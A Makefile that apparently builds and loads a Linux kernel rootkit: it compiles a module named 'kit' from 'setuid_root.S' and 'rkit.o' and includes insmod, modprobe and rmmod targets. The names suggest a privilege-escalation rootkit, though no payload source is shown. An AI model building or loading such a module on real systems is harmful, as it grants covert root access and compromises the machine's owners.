obj-m += kit.o
kit-objs := setuid_root.o rkit.o

KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all: setuid_root.o
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

setuid_root.o: setuid_root.S
	$(AS) --64 setuid_root.S -o setuid_root.o

#UBANTU
install-ubantu:
	sudo modprobe ./kit.ko ; dmesg|tail

install:
	insmod ./kit.ko ; dmesg|tail -n 5

uninstall:
	rmmod kit.ko ; dmesg|tail

